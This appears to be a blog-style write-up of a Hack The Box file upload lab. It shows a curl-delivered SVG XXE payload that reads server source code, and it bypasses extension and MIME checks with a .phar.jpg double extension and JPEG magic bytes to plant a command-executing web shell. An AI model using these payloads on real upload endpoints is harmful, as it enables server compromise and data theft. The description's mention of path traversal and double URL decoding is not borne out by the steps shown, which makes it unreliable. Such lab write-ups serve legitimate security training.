+++
title = 'File Upload Skill Assessment'
date = '2026-01-15T08:36:42-04:00'
draft = false
slug = 'file-upload-skill-assessment'
description = 'Chaining unrestricted file upload, path traversal, and double URL decoding to gain remote code execution.'
tags = ["Web", "HTB"]
difficulty = 'medium'
+++
- Inspecting the webapp and the functionalities found a submit flag functionality.
- I read the JS and the HTML codes to see the validation of the frontend, noticed that only images extensions are allowed. 
- I uploaded a `.png` file and see the request in the burp. it was a GET request and it supposed to be a POST request in uploading a file, so I inspect the code to see the right place to upload files and found in the JS file the correct is to send to the endpoint: `contact/upload.php`
- I asked AI to create me a curl request to send a POST request to this endpoint.
- I fuzzed to see the allowed extension and the allowed content type too and found that `svg` and `images/svg+xml` are allowed.
- So I thought about upload a `svg` file with XXE payload to craft gain the source code of the backend to know the logic, blacklist, and the whitelist of the uploading function.
```xml
curl -s -X POST "154.57.164.61:30775/contact/upload.php" \
  -F "uploadFile=@/dev/stdin;filename=shell.svg;type=image/svg+xml" \
  <<< '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
<text y="20">&xxe;</text>
</svg>'
```
- The parameters of the payload got from the HTML code inspection:
```html
<input name="uploadFile" id="uploadFile" type="file" class="custom-file-input" id="inputGroupFile02" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```
- We got the source code encoded, after decoded, we knew the logic:
```php
<?php require_once('./common-functions.php'); 
// uploaded files directory 
$target_dir = "./user_feedback_submissions/"; 
// rename before storing 
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]); $target_file = $target_dir . $fileName; 
// get content headers 
$contentType = $_FILES['uploadFile']['type']; $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']); 
// blacklist test 
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) { echo "Extension not allowed"; die(); } 
// whitelist test 
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) { echo "Only images are allowed"; die(); } 
// type test 
foreach (array($contentType, $MIMEtype) as $type) { if (!preg_match('/image\/[a-z]{2,3}g/', $type)) { echo "Only images are allowed"; die(); } } 
// size test 
if ($_FILES["uploadFile"]["size"] > 500000) { echo "File too large"; die(); } if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) { displayHTMLImage($target_file); } else { echo "File failed to upload"; } i want to get the flag then
```
- The code tells us the following:
```txt
1. Blacklist: blocks .php .phps .phtml
2. Whitelist: filename must end in [a-z]{2,3}g  → jpg, png, svg, jpeg
3. Content-Type: must match image/[a-z]{2,3}g  → image/jpg, image/png, image/svg, image/jpeg  
4. MIME: same regex check on actual file content
5. Upload dir: ./user_feedback_submissions/
6. The file is stored in the database with a unique schema --> DATE_Filename
```
- I noticed that the `.phar` extension not in the blacklist so I can use in uploading a shell which can allow execution of a PHP code.
- The vulnerability of the whitelist is that it only checks the end of the filename extension has a `g` so using `jpg` with double-extension technique will bypass the filters.
- To ensure the attack implemented successfully, we should put a `jpg` signature to bypass the MIME check --> `\xff\xd8\xff\` 
![[Pasted image 20260607022513.png]]
- So the full request will be:
![[Pasted image 20260607022051.png]]
- The shell is uploaded and now we want to visit it, after some struggling with the data I reached the true path:
```http
http://154.57.164.61:30775/contact/user_feedback_submissions/260606_shell.phar.jpg?cmd=ls
```
- The flag isn't in `flag.txt` as I tried before catch it with the same way I get the source code, so I knew that I needed an RCE.
- I search about flag in the entire system:
```bash
find / -name 'flag*' -o -name '*flag*' -o -name '*.flag' 2>/dev/null
```
- The flag in `flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt` , just read it.
-----
